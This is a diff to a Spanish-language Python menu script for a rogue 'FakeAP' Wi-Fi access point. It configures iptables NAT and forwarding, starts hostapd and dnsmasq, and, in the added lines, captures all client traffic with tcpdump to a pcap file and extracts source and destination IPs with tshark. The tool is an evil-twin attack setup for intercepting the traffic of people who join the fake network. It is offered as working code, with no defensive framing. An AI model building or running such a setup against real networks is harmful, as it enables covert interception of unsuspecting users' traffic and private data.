@@ -73,8 +73,9 @@ else:
 while True:                                                   
     print("\n\033[1m[1] Instalar requisitos\033[0m")
     print("\033[1m[2] Configurar FakeAP\033[0m")
-    print("\033[1m[3] Reiniciar la red y el sistema\033[0m")
-    print("\033[1m[4] Salir\033[0m")
+    print("\033[1m[3] Procesar los registros para ordenar por IP\033[0m")
+    print("\033[1m[4] Reiniciar la red y el sistema\033[0m")
+    print("\033[1m[5] Salir\033[0m")
     opcion = input("\033[1m\n[+] Ingrese una opción: \033[0m")
     if opcion == "1":
         print("\033[1m\n[+] Instalando\n \033[0m")
@@ -87,12 +88,17 @@ while True:
         os.system(f"iptables --table nat --append POSTROUTING --out-interface {adaptador} -j MASQUERADE")
         os.system(f"iptables --append FORWARD --in-interface {primer_adaptador_nombre} -j ACCEPT")
         os.system("echo 1 > /proc/sys/net/ipv4/ip_forward\n")
+        subprocess.Popen(['xterm', '-e', 'bash', '-c', f'tcpdump -i {primer_adaptador_nombre} -w trafico.pcap; exec bash'])
         subprocess.Popen(['xterm', '-e', 'bash', '-c', f'hostapd hostapd.conf -i {primer_adaptador_nombre}; exec bash'])
         subprocess.Popen(['xterm', '-e', 'bash', '-c', f'dnsmasq -C dnsmasq.conf -d -i {primer_adaptador_nombre}; exec bash'])
     elif opcion == "3":
-        print("\033[1m\n[+] Reiniciando la red y el sistema\n \033[0m")
-        os.system("sudo systemctl restart NetworkManager.service")
+        os.system("tshark -r trafico.pcap -T fields -e ip.src -e ip.dst > direcciones_ip.txt")
+        os.system("sort direcciones_ip.txt > direcciones_ip_ordenadas.txt")
     elif opcion == "4":
+        print("\033[1m\n[+] Reiniciando la red y el sistema\n \033[0m")
+        os.system("systemctl restart NetworkManager.service")
+        os.system("reboot")
+    elif opcion == "5":
         # Salir del programa
         break
     else:
